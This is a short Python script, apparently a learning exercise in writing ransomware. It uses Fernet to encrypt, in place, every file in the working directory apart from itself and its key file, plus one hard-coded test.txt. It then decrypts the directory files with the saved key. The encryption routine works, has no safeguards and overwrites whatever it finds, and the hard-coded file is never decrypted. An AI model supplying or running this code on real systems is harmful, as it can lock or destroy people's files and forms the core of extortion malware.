import os
from cryptography.fernet import Fernet
import optparse

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

#encrytion

with open("thekey.key","wb") as thekey:
    thekey.write(key)

with open("C:/Users/tusha/OneDrive/Desktop/ransomware/test.txt","rb") as thefile:
    contents = thefile.read()
contents_encrypted = Fernet(key).encrypt(contents)
with open("C:/Users/tusha/OneDrive/Desktop/ransomware/test.txt","wb") as thefile:
    thefile.write(contents_encrypted)

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted)

# decryption

with open("thekey.key","rb") as key:
    secretkey = key.read()

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_decrypted = Fernet(secretkey).decrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_decrypted)